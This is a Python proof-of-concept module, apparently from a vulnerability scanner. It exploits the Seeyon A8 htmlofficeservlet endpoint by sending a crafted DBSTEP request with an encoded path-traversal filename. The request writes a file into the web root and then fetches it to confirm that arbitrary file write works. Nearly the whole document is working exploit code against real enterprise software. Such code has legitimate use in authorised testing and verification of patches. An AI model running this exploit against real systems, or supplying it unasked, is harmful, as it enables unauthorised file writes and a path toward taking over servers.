'''
Function:
    seeyonA8_htmlofficeservlet
Author:
    spmonkey
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import requests
import os
import sys
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()
path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(path)
from modules import get_user_agent


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': get_user_agent.get_user_agent(),
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        self.result_text = ""
        self.proxies = proxies

    def encode(self, input_str):
        letters = "gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6"
        str_ascii_list = ['{:0>8}'.format(str(bin(ord(i))).replace('0b', ''))
                          for i in input_str]
        output_str = ''
        equal_num = 0
        while str_ascii_list:
            temp_list = str_ascii_list[:3]
            if len(temp_list) != 3:
                while len(temp_list) < 3:
                    equal_num += 1
                    temp_list += ['0' * 8]
            temp_str = ''.join(temp_list)
            temp_str_list = [temp_str[x:x + 6] for x in [0, 6, 12, 18]]
            temp_str_list = [int(x, 2) for x in temp_str_list]
            if equal_num:
                temp_str_list = temp_str_list[0:4 - equal_num]
            output_str += ''.join([letters[x] for x in temp_str_list])
            str_ascii_list = str_ascii_list[3:]
        output_str = output_str + '=' * equal_num
        return output_str

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return netloc, scheme

    def vuln(self, netloc, scheme):
        url = "{}://{}/seeyon/htmlofficeservlet".format(scheme, netloc)
        try:
            result_check = requests.get(url=url, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
            if "htmoffice" in result_check.text:
                file_name = self.encode('..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\assassin.txt')
                payload = "DBSTEP V3.0     355             0               10             DBSTEP=OKMLlKlV\r\n"
                payload += "OPTION=S3WYOSWLBSGr\r\n"
                payload += "currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\n"
                payload += "CREATEDATE=wUghPB3szB3Xwg66\r\n"
                payload += "RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\n"
                payload += "originalFileId=wV66\r\n"
                payload += "originalCreateDate=wUghPB3szB3Xwg66\r\n"
                payload += "FILENAME={}\r\n".format(file_name)
                payload += "needReadFile=yRWZdAS6\r\n"
                payload += "originalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n"
                payload += "assassin"
                requests.post(url=url, data=payload, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
                url_check = "{}://{}/seeyon/assassin.txt".format(scheme, netloc)
                result = requests.get(url=url_check, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
                if "assassin" in result.text:
                    target = urlparse(url)
                    self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意命令执行漏洞\033[0m
                 GET {} HTTP/1.1
                 Host: {}""".format(target.path, target.netloc)
                    for request_type, request_text in dict(result_check.request.headers).items():
                        self.result_text += "\n                 {}: {}".format(request_type, request_text)
                    return True
                else:
                            return False
            else:
                    return False
        except:
            return False

    def main(self):
        all = self.host()
        netloc = all[0]
        scheme = all[1]
        if self.vuln(netloc, scheme):
            return self.result_text
        else:
            return False
